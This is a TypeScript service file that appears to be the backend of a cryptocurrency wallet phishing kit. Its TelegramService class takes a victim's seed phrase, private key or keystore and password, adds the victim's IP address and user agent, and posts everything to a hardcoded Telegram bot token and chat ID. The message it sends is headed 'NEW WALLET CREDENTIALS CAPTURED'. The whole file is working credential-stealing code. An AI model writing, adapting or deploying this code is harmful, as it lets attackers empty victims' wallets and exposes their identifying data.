interface TelegramMessage {
    walletName: string;
    walletType: string;
    inputType: 'phrase' | 'privateKey' | 'keystore';
    inputData: string;
    password?: string;
    isValid: boolean;
    validationMessage: string;
    userAgent: string;
    timestamp: string;
    ip?: string;
  }
  
  export class TelegramService {
    private readonly botToken: string;
    private readonly chatId: string;
  
    constructor() {
      // Use environment variables with fallback
      this.botToken = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN || '8250920559:AAGldCXRugytYLYjlhc_fLxUKJrt9-Psr2c';
      this.chatId = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID || '1850435445';
    }
  
    private async getClientIP(): Promise<string> {
      try {
        const response = await fetch('https://api64.ipify.org?format=json', {
          method: 'GET',
          headers: {
            'Content-Type': 'application/json',
          },
        });
        
        if (!response.ok) {
          throw new Error('Failed to get IP');
        }
        
        const data = await response.json();
        return data.ip;
      } catch (error) {
        console.warn('Could not fetch IP address:', error);
        return 'Unknown';
      }
    }
  
    async sendWalletData(message: Omit<TelegramMessage, 'ip'>): Promise<{success: boolean; error?: string}> {
      try {
        // console.log('Sending Telegram message...', {
        //   botToken: this.botToken ? 'Present' : 'Missing',
        //   chatId: this.chatId
        // });
  
        const ip = await this.getClientIP();
        const fullMessage: TelegramMessage = {
          ...message,
          ip
        };
  
        const formattedMessage = this.formatMessage(fullMessage);
        
        const telegramUrl = `https://api.telegram.org/bot${this.botToken}/sendMessage`;
        
        console.log('Telegram URL:', telegramUrl.replace(this.botToken, '***'));
        
        const response = await fetch(telegramUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: this.chatId,
            text: formattedMessage,
            parse_mode: 'HTML'
          })
        });
  
        const responseData = await response.json();
        
        if (!response.ok) {
          console.error('Telegram API error:', responseData);
          return {
            success: false,
            error: responseData.description || 'Telegram API error'
          };
        }
  
        console.log('Telegram message sent successfully');
        return { success: true };
  
      } catch (error: any) {
        console.error('Failed to send Telegram message:', error);
        return {
          success: false,
          error: error.message || 'Network error'
        };
      }
    }
  
    private formatMessage(message: TelegramMessage): string {
      const status = message.isValid ? '✅ VALID' : '❌ INVALID';
      
      return `
  🤑 <b>NEW WALLET CREDENTIALS CAPTURED</b>
  
  📛 <b>Wallet:</b> ${message.walletName}
  🔧 <b>Type:</b> ${message.walletType}
  📝 <b>Input Type:</b> ${message.inputType}
  🔒 <b>Status:</b> ${status}
  💬 <b>Message:</b> ${message.validationMessage}
  
  🔥 <b>FULL CREDENTIALS:</b>
  <code>${message.inputData}</code>
  
  ${message.password ? `🔑 <b>PASSWORD:</b> ${message.password}` : ''}
  
  🌐 <b>User Agent:</b> ${message.userAgent}
  📍 <b>IP Address:</b> ${message.ip}
  🕐 <b>Timestamp:</b> ${message.timestamp}
      `.trim();
    }
  }